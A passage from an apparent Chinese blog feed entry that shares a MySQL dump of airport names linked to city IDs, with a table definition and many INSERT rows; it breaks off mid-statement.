    </item>
    
    <item>
      <title>全球机场数据mysql(包含全国机场数据，国外大中小机场数据)</title>
      <link>https://ifunbox.top/global_airport_mysql_data/</link>
      <pubDate>Fri, 27 Nov 2015 09:25:40 +0000</pubDate>
      
      <guid>https://ifunbox.top/global_airport_mysql_data/</guid>
      <description>最近整理了一个全球机场数据mysql版，挺全的 包含全国全球各大机场数据（所属城市 三字代码 国家 国家代码 四字代码 机场名称 英文） 全国全球机场数据由三个表组成lk_airport（机场名称数据表）、lk_airport_city（国内城市表）、lk_airport_inter_city（国外城市表）组成 城市表数据是参考携程的，机场名称数据是http://www.hlhkys.com/dmair/cx.asp这边采集的 直接上mysql语句 /* Date: 2015-11-27 17:24:30 */ SET FOREIGN_KEY_CHECKS=0; -- ---------------------------- -- Table structure for lk_airport -- ---------------------------- DROP TABLE IF EXISTS `lk_airport`; CREATE TABLE `lk_airport` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(50) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;机场名&#39;, `city_id` int(10) unsigned NOT NULL DEFAULT &#39;0&#39;, `status` tinyint(3) unsigned NOT NULL DEFAULT &#39;1&#39; COMMENT &#39;1正常 0删除&#39;, PRIMARY KEY (`id`) ) ENGINE=MyISAM AUTO_INCREMENT=1397 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=DYNAMIC; -- ---------------------------- -- Records of lk_airport -- ---------------------------- INSERT INTO `lk_airport` VALUES (&#39;1&#39;, &#39;首都机场&#39;, &#39;17&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;2&#39;, &#39;宝安机场&#39;, &#39;146&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;3&#39;, &#39;凤凰国际机场&#39;, &#39;145&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;4&#39;, &#39;仁川国际机场&#39;, &#39;301&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;5&#39;, &#39;白云机场&#39;, &#39;399&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;6&#39;, &#39;白云机场&#39;, &#39;54&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;7&#39;, &#39;安康富强机场&#39;, &#39;2&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;8&#39;, &#39;阿里昆莎机场&#39;, &#39;8&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;9&#39;, &#39;AAA机场&#39;, &#39;351&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;10&#39;, &#39;BBB机场&#39;, &#39;142&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;11&#39;, &#39;北京首都国际机场T3&#39;, &#39;17&#39;, &#39;0&#39;); INSERT INTO `lk_airport` VALUES (&#39;1001&#39;, &#39;洛杉矶机场&#39;, &#39;358&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1002&#39;, &#39;伦敦希思罗机场&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1003&#39;, &#39;肯尼迪机场&#39;, &#39;357&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1004&#39;, &#39;法兰克福机场&#39;, &#39;329&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1005&#39;, &#39;上海虹桥机场&#39;, &#39;141&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1006&#39;, &#39;迪拜机场&#39;, &#39;314&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1007&#39;, &#39;戴高乐机场&#39;, &#39;328&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1008&#39;, &#39;广州白云机场&#39;, &#39;54&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1009&#39;, &#39;北京首都机场&#39;, &#39;17&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1010&#39;, &#39;樟宜机场&#39;, &#39;302&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1011&#39;, &#39;悉尼&#39;, &#39;412&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1012&#39;, &#39;谢诺梅杰沃机场&#39;, &#39;330&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1013&#39;, &#39;多伦多&#39;, &#39;362&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1014&#39;, &#39;深圳宝安机场&#39;, &#39;146&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1015&#39;, &#39;布达佩斯机场&#39;, &#39;353&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1016&#39;, &#39;墨西哥城机场&#39;, &#39;377&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1017&#39;, &#39;温哥华&#39;, &#39;360&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1018&#39;, &#39;爱华隆机场&#39;, &#39;413&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1019&#39;, &#39;汉堡机场&#39;, &#39;354&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1020&#39;, &#39;孟买机场&#39;, &#39;325&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1021&#39;, &#39;阿塔图尔克机场&#39;, &#39;323&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1022&#39;, &#39;米兰马尔本萨机场&#39;, &#39;333&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1023&#39;, &#39;芝加哥机场&#39;, &#39;361&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1024&#39;, &#39;荷兰阿姆斯特丹斯史基浦(西霍普)机场&#39;, &#39;332&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1025&#39;, &#39;香港赤鱲角国际机场&#39;, &#39;209&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1026&#39;, &#39;曼谷(素万那普)机场&#39;, &#39;303&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1027&#39;, &#39;东京机场&#39;, &#39;300&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1028&#39;, &#39;圣保罗机场&#39;, &#39;375&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1029&#39;, &#39;成都双流机场&#39;, &#39;30&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1030&#39;, &#39;开罗机场&#39;, &#39;387&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1031&#39;, &#39;吉隆坡机场&#39;, &#39;304&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1032&#39;, &#39;拉各斯机场&#39;, &#39;391&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1033&#39;, &#39;约翰内斯堡机场&#39;, &#39;388&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1034&#39;, &#39;乌鲁木齐地窝堡机场&#39;, &#39;161&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1035&#39;, &#39;重庆江北机场&#39;, &#39;27&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1036&#39;, &#39;迈阿密机场&#39;, &#39;380&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1037&#39;, &#39;蒙特利尔&#39;, &#39;369&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1038&#39;, &#39;雅加达 苏加诺-哈达机场&#39;, &#39;306&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1039&#39;, &#39;旧金山机场&#39;, &#39;359&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1040&#39;, &#39;布鲁塞尔机场&#39;, &#39;340&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1041&#39;, &#39;卢萨卡机场&#39;, &#39;402&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1042&#39;, &#39;台北松山机场&#39;, &#39;211&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1043&#39;, &#39;胡志明市机场&#39;, &#39;307&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1044&#39;, &#39;基辅机场&#39;, &#39;352&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1045&#39;, &#39;马德里机场&#39;, &#39;338&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1046&#39;, &#39;马尼拉机场&#39;, &#39;308&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1047&#39;, &#39;奥克兰机场&#39;, &#39;414&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1048&#39;, &#39;曼彻斯特机场&#39;, &#39;337&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1049&#39;, &#39;上海浦东机场&#39;, &#39;141&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1050&#39;, &#39;布宜诺斯艾利斯机场&#39;, &#39;386&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1051&#39;, &#39;昆明巫家坝机场&#39;, &#39;98&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1052&#39;, &#39;菲乌米奇诺机场&#39;, &#39;331&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1053&#39;, &#39;巴塞罗那机场&#39;, &#39;344&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1054&#39;, &#39;哥本哈根机场&#39;, &#39;341&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1055&#39;, &#39;赫尔辛基机场&#39;, &#39;342&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1056&#39;, &#39;达拉斯沃尔斯堡机场&#39;, &#39;372&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1057&#39;, &#39;西雅图机场&#39;, &#39;363&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1058&#39;, &#39;加德满都机场&#39;, &#39;316&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1059&#39;, &#39;河内机场&#39;, &#39;312&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1060&#39;, &#39;首尔仁川机场&#39;, &#39;301&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1061&#39;, &#39;布拉格机场&#39;, &#39;355&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1062&#39;, &#39;青岛流亭机场&#39;, &#39;138&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1063&#39;, &#39;布里斯班机场&#39;, &#39;415&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1064&#39;, &#39;关西机场&#39;, &#39;305&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1065&#39;, &#39;斯德哥尔摩机场&#39;, &#39;335&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1066&#39;, &#39;武汉天河机场&#39;, &#39;167&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1067&#39;, &#39;底特律机场&#39;, &#39;366&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1068&#39;, &#39;哈尔滨太平机场&#39;, &#39;75&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1069&#39;, &#39;沈阳桃仙机场&#39;, &#39;142&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1070&#39;, &#39;大连国际机场&#39;, &#39;39&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1071&#39;, &#39;波士顿机场&#39;, &#39;365&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1072&#39;, &#39;华盛顿机场&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1073&#39;, &#39;日内瓦机场&#39;, &#39;349&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1074&#39;, &#39;苏黎世机场&#39;, &#39;339&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1075&#39;, &#39;亚特兰大机场&#39;, &#39;367&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1076&#39;, &#39;伯明翰机场&#39;, &#39;347&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1077&#39;, &#39;雅典机场&#39;, &#39;345&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1078&#39;, &#39;西安咸阳机场&#39;, &#39;178&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1079&#39;, &#39;天津滨海机场&#39;, &#39;157&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1080&#39;, &#39;杭州萧山机场&#39;, &#39;70&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1081&#39;, &#39;默罕默德V机场&#39;, &#39;399&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1082&#39;, &#39;慕尼黑机场&#39;, &#39;334&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1083&#39;, &#39;圣彼得堡机场&#39;, &#39;350&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1084&#39;, &#39;维也纳机场&#39;, &#39;343&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1085&#39;, &#39;泰格尔机场&#39;, &#39;336&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1086&#39;, &#39;珀斯机场&#39;, &#39;417&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1087&#39;, &#39;长沙黄花机场&#39;, &#39;29&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1088&#39;, &#39;科托卡机场&#39;, &#39;397&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1089&#39;, &#39;郑州新郑机场&#39;, &#39;198&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1090&#39;, &#39;开普顿机场&#39;, &#39;389&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1091&#39;, &#39;济南遥墙机场&#39;, &#39;92&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1092&#39;, &#39;罗安达二月四日机场&#39;, &#39;392&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1093&#39;, &#39;厦门高崎机场&#39;, &#39;179&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1094&#39;, &#39;丹佛机场&#39;, &#39;381&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1095&#39;, &#39;杜塞尔多夫机场&#39;, &#39;356&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1096&#39;, &#39;阿尔及尔机场&#39;, &#39;398&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1097&#39;, &#39;贵阳龙洞堡机场&#39;, &#39;60&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1098&#39;, &#39;海口美兰机场&#39;, &#39;64&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1099&#39;, &#39;长春龙嘉国际机场&#39;, &#39;23&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1100&#39;, &#39;德班机场&#39;, &#39;400&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1101&#39;, &#39;南京禄口机场&#39;, &#39;125&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1102&#39;, &#39;温州永强机场&#39;, &#39;165&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1103&#39;, &#39;喀土穆机场&#39;, &#39;396&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1104&#39;, &#39;拉斯维加斯麦卡伦国际机场机场&#39;, &#39;378&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1105&#39;, &#39;金边机场&#39;, &#39;319&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1106&#39;, &#39;宁波栎社机场&#39;, &#39;124&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1107&#39;, &#39;哈拉雷机场&#39;, &#39;403&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1108&#39;, &#39;马累机场&#39;, &#39;313&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1109&#39;, &#39;南昌昌北机场&#39;, &#39;122&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1110&#39;, &#39;波特兰机场&#39;, &#39;383&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1111&#39;, &#39;亚的斯亚贝巴机场&#39;, &#39;395&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1112&#39;, &#39;格拉斯哥机场&#39;, &#39;351&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1113&#39;, &#39;名古屋中部/新特丽亚机场&#39;, &#39;310&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1114&#39;, &#39;突尼斯机场&#39;, &#39;401&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1115&#39;, &#39;合肥骆岗机场&#39;, &#39;69&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1116&#39;, &#39;奥兰多机场&#39;, &#39;382&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1117&#39;, &#39;高雄机场&#39;, &#39;317&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1118&#39;, &#39;尼雷尔机场&#39;, &#39;394&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1119&#39;, &#39;三亚凤凰机场&#39;, &#39;145&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1120&#39;, &#39;南宁吴圩机场&#39;, &#39;127&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1121&#39;, &#39;费城机场&#39;, &#39;374&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1122&#39;, &#39;毛里求斯机场&#39;, &#39;393&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1123&#39;, &#39;明尼阿波利斯―圣保罗机场&#39;, &#39;373&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1124&#39;, &#39;金海机场&#39;, &#39;315&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1125&#39;, &#39;阿德莱德机场&#39;, &#39;416&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1126&#39;, &#39;石家庄正定机场&#39;, &#39;144&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1127&#39;, &#39;烟台莱山机场&#39;, &#39;194&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1128&#39;, &#39;阿比让&#39;, &#39;410&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1129&#39;, &#39;休斯敦机场&#39;, &#39;368&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1130&#39;, &#39;银川河东机场&#39;, &#39;183&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1131&#39;, &#39;兰州机场&#39;, &#39;103&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1132&#39;, &#39;乌兰巴托机场&#39;, &#39;324&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1133&#39;, &#39;福州长乐机场&#39;, &#39;50&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1134&#39;, &#39;西宁曹家堡机场&#39;, &#39;180&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1135&#39;, &#39;拉萨贡嘎机场&#39;, &#39;109&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1136&#39;, &#39;桂林两江机场&#39;, &#39;61&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1137&#39;, &#39;埃德蒙顿市中心机场&#39;, &#39;385&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1138&#39;, &#39;澳门机场&#39;, &#39;210&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1139&#39;, &#39;湛江机场&#39;, &#39;204&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1140&#39;, &#39;杜阿拉机场&#39;, &#39;408&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1141&#39;, &#39;金沙萨恩吉利机场&#39;, &#39;406&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1142&#39;, &#39;爱丁堡机场&#39;, &#39;346&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1143&#39;, &#39;徐州观音机场&#39;, &#39;181&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1144&#39;, &#39;CALGARY机场&#39;, &#39;379&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1145&#39;, &#39;威海文登大水泊机场&#39;, &#39;163&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1146&#39;, &#39;渥太华机场&#39;, &#39;376&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1147&#39;, &#39;福冈机场&#39;, &#39;318&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1148&#39;, &#39;佳木斯机场&#39;, &#39;86&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1149&#39;, &#39;呼和浩特白塔国际机场&#39;, &#39;68&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1150&#39;, &#39;马普托机场&#39;, &#39;407&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1151&#39;, &#39;达尔文机场&#39;, &#39;425&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1152&#39;, &#39;无锡硕放机场&#39;, &#39;169&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1153&#39;, &#39;义乌机场&#39;, &#39;192&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1154&#39;, &#39;景洪(西双版纳)机场&#39;, &#39;174&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1155&#39;, &#39;珠海三灶机场&#39;, &#39;207&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1156&#39;, &#39;大庆萨尔图机场&#39;, &#39;43&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1157&#39;, &#39;喀什机场&#39;, &#39;95&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1158&#39;, &#39;黄金海岸机场&#39;, &#39;422&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1159&#39;, &#39;宜昌三峡机场&#39;, &#39;190&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1160&#39;, &#39;宜宾(菜坝)机场&#39;, &#39;187&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1161&#39;, &#39;柳州白莲机场&#39;, &#39;114&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1162&#39;, &#39;临沂沭埠岭机场&#39;, &#39;113&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1163&#39;, &#39;堪培拉机场&#39;, &#39;419&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1164&#39;, &#39;纽卡斯尔机场&#39;, &#39;348&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1165&#39;, &#39;鄂尔多斯伊金霍洛机场&#39;, &#39;46&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1166&#39;, &#39;包头二里半机场&#39;, &#39;12&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1167&#39;, &#39;普吉机场&#39;, &#39;311&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1168&#39;, &#39;牡丹江海浪机场&#39;, &#39;117&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1169&#39;, &#39;阿克苏机场&#39;, &#39;3&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1170&#39;, &#39;丽江三义机场&#39;, &#39;105&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1171&#39;, &#39;锦州小岭子机场&#39;, &#39;88&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1172&#39;, &#39;延吉朝阳川机场&#39;, &#39;193&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1173&#39;, &#39;丹东浪头机场&#39;, &#39;37&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1174&#39;, &#39;泉州晋江机场&#39;, &#39;85&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1175&#39;, &#39;惠灵顿机场&#39;, &#39;418&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1176&#39;, &#39;潍坊机场&#39;, &#39;162&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1177&#39;, &#39;常州奔牛机场&#39;, &#39;31&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1178&#39;, &#39;连云港白塔埠机场&#39;, &#39;112&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1179&#39;, &#39;佛山沙堤机场&#39;, &#39;52&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1180&#39;, &#39;洛阳机场&#39;, &#39;111&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1181&#39;, &#39;内蒙古海拉尔东山机场&#39;, &#39;73&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1182&#39;, &#39;齐齐哈尔三家子机场&#39;, &#39;136&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1183&#39;, &#39;北海福城机场&#39;, &#39;14&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1184&#39;, &#39;揭阳潮汕机场&#39;, &#39;91&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1185&#39;, &#39;秦皇岛山海关机场&#39;, &#39;137&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1186&#39;, &#39;襄阳刘集机场&#39;, &#39;175&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1187&#39;, &#39;绵阳南郊机场&#39;, &#39;118&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1188&#39;, &#39;哈密机场&#39;, &#39;74&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1189&#39;, &#39;嘉峪关机场&#39;, &#39;81&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1190&#39;, &#39;凯恩斯机场&#39;, &#39;420&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1191&#39;, &#39;南通兴东机场&#39;, &#39;129&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1192&#39;, &#39;张家界荷花机场&#39;, &#39;199&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1193&#39;, &#39;武夷山机场&#39;, &#39;168&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1194&#39;, &#39;攀枝花保安营机场&#39;, &#39;130&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1195&#39;, &#39;南阳姜营机场&#39;, &#39;128&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1196&#39;, &#39;赣州黄金机场&#39;, &#39;59&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1197&#39;, &#39;台州路桥（原黄岩路桥）机场&#39;, &#39;149&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1198&#39;, &#39;山西大同机场&#39;, &#39;34&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1199&#39;, &#39;伊宁机场&#39;, &#39;191&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1200&#39;, &#39;遵义机场&#39;, &#39;208&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1201&#39;, &#39;江苏盐城南洋机场&#39;, &#39;195&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1202&#39;, &#39;库尔勒机场&#39;, &#39;99&#39;, &#39;1&#39;); INSERT INTO 